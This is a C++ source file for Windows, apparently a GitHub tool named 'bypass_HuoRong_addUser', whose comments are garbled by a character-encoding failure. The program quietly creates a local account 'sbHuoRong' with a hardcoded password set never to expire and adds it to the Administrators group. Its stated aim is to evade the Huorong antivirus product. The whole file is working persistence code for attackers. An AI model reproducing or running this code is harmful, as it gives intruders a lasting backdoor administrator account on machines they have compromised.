/*************************************
//bypass ��������û�
**************************************/
#define _CRT_SECURE_NO_WARNINGS
#include <windows.h>
#include <lm.h>
#include <stdio.h>
#include <ctime>
#pragma comment(lib, "netapi32.lib")//����ϵͳ��̬��

//��������
int AddUser(LPWSTR username_args, LPWSTR password_args);
int AddLocalGroupAdministrators(LPWSTR user);
int UserExists(LPWSTR userName);
void GetSystemTime();

HANDLE consolehwnd;//��������̨��� ʵ�������ɫ����
int main(int argc, char* args[])
{
	consolehwnd=GetStdHandle(STD_OUTPUT_HANDLE);//ʵ�������
    const wchar_t* username = L"sbHuoRong";//��ӵ��û��� const wchar_t* ���ֽڳ�ָ������
    const wchar_t* password = L"admin@Fuck748";//��ӵ����� const wchar_t* ���ֽڳ�ָ������
    // �� const wchar_t* ת��Ϊ LPWSTR
    wchar_t* usernameWritable = const_cast<wchar_t*>(username);//ǿתΪLPWSTR����
    wchar_t* passwordWritable = const_cast<wchar_t*>(password);//ǿתΪLPWSTR����
    //���ж�sbHuoRong ����û��Ƿ���� �������������ӣ������������ʾ��
    int code = UserExists(usernameWritable);
    switch (code)
    {
    case 200:
        //�����������ʾ
        GetSystemTime();//��ȡϵͳʱ��
		printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_RED);//���ú�ɫ
		printf("The user sbHuoRong already exists��\n");//�˴�Ϊ��ɫ����
		SetConsoleTextAttribute(consolehwnd, 7); // �ָ�����̨Ĭ����ɫ
        break;
    case 404:
        //������
         //����û���������
        GetSystemTime();//��ȡϵͳʱ��
        AddUser(usernameWritable, passwordWritable);
        //���û���ӵ�����Ա��
        AddLocalGroupAdministrators(usernameWritable);
        break;
    case 500:
        //��������
        GetSystemTime();//��ȡϵͳʱ��
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_RED);//���������ɫ
		printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
		printf("Other errors��\n");//�˴�Ϊ��ɫ����
		SetConsoleTextAttribute(consolehwnd, 7); // �ָ�����̨Ĭ����ɫ
        break;
    }
	return 0;
}

//����û��������뷽��
int AddUser(LPWSTR username_args, LPWSTR password_args) {
    USER_INFO_1 userInfo;//�����ṹ��
    DWORD level = 1;
    DWORD error = 0;
    // ���ýṹ���û���Ϣ 
    userInfo.usri1_name = username_args; // �û���
    userInfo.usri1_password = password_args; // ����
    userInfo.usri1_priv = USER_PRIV_USER; // �û�Ȩ�ޣ���������Ϊ��ͨ�û�
    userInfo.usri1_home_dir = NULL; // �û���Ŀ¼��Ĭ��Ϊ NULL
    userInfo.usri1_comment = NULL; // �û���ע��Ĭ��Ϊ NULL
    userInfo.usri1_flags = UF_DONT_EXPIRE_PASSWD;// �û���־��������Ϊ������������
    // ����û�
    NET_API_STATUS result = NetUserAdd(NULL, level, (LPBYTE)&userInfo, &error);
    if (result == NERR_Success)
    {
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_INTENSITY|FOREGROUND_GREEN);//������ɫ
		//�˴�Ϊ��ɫ����
		printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
		printf("[+] Supports all versions of Windows XP - Windows 10\n");
		printf("[+] Add User Successful��\n");
        printf("[+] Username is -> sbHuoRong\n");
        printf("[+] Password is -> admin@Fuck748\n");
        printf("[+] Password never expires��\n");
		SetConsoleTextAttribute(consolehwnd, 7); // �ָ�����̨Ĭ����ɫ
    }
    else
    {
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_RED);//���������ɫ
		//�˴�Ϊ��ɫ����
		printf("[+] https://github.com/0x6C696A756E/bypass_HuoRong_addUser\n");
		printf("!!! Add User Error!��Code��%d\n", result);
		SetConsoleTextAttribute(consolehwnd, 7); // �ָ�����̨Ĭ����ɫ
    }
    return 0;
}

//���û���ӵ�����Ա��
int AddLocalGroupAdministrators(LPWSTR user) {
    // ���û���ӵ�����Ա��
    LOCALGROUP_MEMBERS_INFO_3 members;
    members.lgrmi3_domainandname = user;
    DWORD  result = NetLocalGroupAddMembers(NULL, L"Administrators", 3, reinterpret_cast<LPBYTE>(&members), 1);
    if (result == NERR_Success) {
        // �û���ӵ�����Ա��ɹ�
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_INTENSITY|FOREGROUND_GREEN);//������ɫ
		printf("[+] Add User sbHuoRong to administrators Successful��\n");//�˴�Ϊ��ɫ����
		SetConsoleTextAttribute(consolehwnd, 7); // �ָ�����̨Ĭ����ɫ
    }
    else {
        // �û���ӵ�����Ա��ʧ��
		SetConsoleTextAttribute(consolehwnd,FOREGROUND_RED);//���������ɫ
		//�˴�Ϊ��ɫ����
		printf("!!! Add LocalGroup Error!��Code��%d\n", result);
		SetConsoleTextAttribute(consolehwnd, 7); // �ָ�����̨Ĭ����ɫ
    }
    return 0;
}

//�ж�sbHuoRong �û��Ƿ����
int UserExists(LPWSTR userName) {
    USER_INFO_1* userInfo = NULL;
    DWORD dwLevel = 1;
    DWORD dwError = 0;
    // Get user info
    dwError = NetUserGetInfo(NULL, userName, dwLevel, (LPBYTE*)&userInfo);
    if (dwError == NERR_UserNotFound) {
        // User does not exist ������
        return 404;
    }
    else if (dwError == NERR_Success) {
        // User exists ����
        return 200;
    }
    else {
        // Error ��������
        return 500;
    }
    NetApiBufferFree(userInfo);//ָ���ͷ�
}


//��ȡϵͳʱ��
void GetSystemTime() {
    time_t now = time(0);
    char timestamp[80];
    struct tm tstruct;
    tstruct = *localtime(&now);
    strftime(timestamp, sizeof(timestamp), "%Y-%m-%d %H:%M:%S", &tstruct);
    printf("[+] %s\n", timestamp);
}